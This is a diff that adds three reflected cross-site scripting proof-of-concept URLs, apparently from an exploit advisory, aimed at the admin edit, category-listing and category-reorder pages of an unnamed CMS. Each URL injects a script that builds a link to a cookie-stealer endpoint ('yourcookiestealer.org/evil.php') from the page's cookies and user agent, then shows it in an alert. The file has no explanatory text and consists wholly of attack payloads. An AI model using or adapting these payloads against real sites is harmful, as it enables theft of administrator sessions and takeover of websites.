@@ -1,0 +1,5 @@
+http://www.example.com/cms/admin/?action=edit&amp;slab=home&#039;&gt;&lt;script&gt;alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&amp;useragent=&#039;%20+%20encodeURI(navigator.userAgent));&lt;/script&gt;&lt;form
+
+http://www.example.com/cms/admin/?action=showcats&amp;unpub=true&amp;slabID=1&amp;catname=sidebar&#039;&gt;&lt;script&gt;alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&amp;useragent=&#039;%20+%20encodeURI(navigator.userAgent));&lt;/script&gt;&lt;form
+
+http://www.example.com/cms/admin/?action=reordercat&amp;cat=sidebar&#039;&gt;&lt;script&gt;alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&amp;useragent=&#039;%20+%20encodeURI(navigator.userAgent));&lt;/script&gt;&lt;form&amp;param=0,1 
